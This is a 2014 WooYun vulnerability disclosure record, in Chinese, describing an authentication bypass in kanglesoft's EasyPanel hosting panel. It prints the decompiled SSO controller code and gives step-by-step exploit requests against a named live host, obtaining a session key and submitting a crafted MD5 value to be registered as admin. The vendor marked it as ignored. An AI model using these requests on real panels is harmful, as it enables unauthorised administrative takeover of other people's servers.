{"id": 48352, "wybug_id": "wooyun-2014-080099", "wybug_title": "EasyPanel 绕过登陆GETSHELL", "wybug_corp": "kanglesoft.com", "wybug_author": "Matt", "wybug_date": "2014-10-20 17:01", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-25：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： EasyPanel 绕过登陆GETSHELL 详细说明：  通过解密代码后发现 其中admin/contral/sso.ctl.php\n<?php/*********************//*  iRadikal.com     *//*         NWS       *//* IonCube 7 support *//*        by:        *//*      tokk250      *//*********************/class SsoControl extends Control{    public function hello( )    {        session_unset( );        $base_passwd = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789\";        $len = 264;        $sess_key = \"\";        $i = 248;        while ( $i < $len )        {            ++$i;        }        $url = $_REQUEST['url'].\"&r=\".$sess_key;//会吧我们需要的key穿到url上        $_SESSION['sess_key'] = $sess_key;        header( \"Location: \".$url );        exit( );    }    public function login( )    {        if ( $_SESSION['sess_key'] == \"\" )        {            exit( \"error,sess_key is empty\" );        }        $str = $_REQUEST['r'].$name.$_SESSION[sess_key].$skey;//这里对key进行加密//name和skey我们不可控，但是我输出看了一下，默认是空//so?        $md5str = $_REQUEST['name'];        if ( strtolower( $md5str ) == $_REQUEST['s'] && $_REQUEST['s'] != \"\" )        {            registerRole( \"admin\", \"admin\" );            header( \"Location: ?c=vhost&a=showVhost&name=\".$name );            exit( );        }        else        {            exit( \"login failed\" );        }    }}?>\n一看明显可以绕过登陆 但是测试一直不成功，忽然想到是不是解密出了问题然后发现其中一个可疑的地方\nstrtolower( $md5str )\n这里应该是md5($str)才说得通把。通过这个来利用   漏洞证明：  利用方法 打开http://360.yazv.com:3312/admin/?c=sso&a=hello获取一个SESS KEY 然后把获取到的SESS KEY MD5（12sess key） 这样md5加密一下然后提交http://360.yazv.com:3312/admin/?c=sso&a=loginPOSTname=12&s=910048b41274d75474c7cf701bb21375\n\n\n\n   修复方案：  你猜   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 2014-11-21：初始化时设置安全码即可。  ", "replys": "漏洞评价：\n评论\n     2014-11-21 14:18 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  呵呵，又是一个不负责任的厂商    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}